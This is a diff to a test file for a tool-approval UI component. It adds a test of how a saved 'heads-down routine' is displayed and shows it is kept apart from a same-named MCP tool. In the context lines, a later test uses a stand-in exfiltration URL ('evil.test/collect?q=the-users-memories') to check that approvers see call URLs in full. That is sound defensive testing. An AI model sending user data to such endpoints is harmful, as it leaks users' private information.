@@ -34,6 +34,48 @@ describe("ToolApprovalBar", () => {
     expect(await renderToHtml(<ToolApprovalBar approvals={[]} onRespond={() => {}} />)).toBe("");
   });
 
+  it("lays out a heads-down routine to read, but not for an MCP tool of the same name", async () => {
+    const args = {
+      name: "check-release",
+      description: "Checks the release channel",
+      once: true,
+      replace: true,
+      tools: ["slack_read_channel"],
+      config: { channel: "#releases" },
+      body: "Read the channel.\n\nTell me what shipped.",
+    };
+    const text = textOf(
+      await renderToHtml(
+        <ToolApprovalBar
+          approvals={[
+            approval({
+              toolId: "save_heads_down_routine",
+              name: "save_heads_down_routine",
+              server: "",
+              args,
+            }),
+          ]}
+          onRespond={() => {}}
+        />,
+      ),
+    );
+    expect(text).toContain("check-release replaces the routine of this name · once");
+    expect(text).toContain("Tools: slack_read_channel");
+    expect(text).toContain("channel: #releases");
+    expect(text).toContain("Every pass that runs it is told:");
+    expect(text).toContain("Tell me what shipped.");
+
+    const mcp = textOf(
+      await renderToHtml(
+        <ToolApprovalBar
+          approvals={[approval({ toolId: "mcp:x:save_heads_down_routine", args })]}
+          onRespond={() => {}}
+        />,
+      ),
+    );
+    expect(mcp).not.toContain("Every pass that runs it is told");
+  });
+
   it("shows a call's URL in full without opening the arguments", async () => {
     const target = "https://evil.test/collect?q=the-users-memories";
     const html = await renderToHtml(
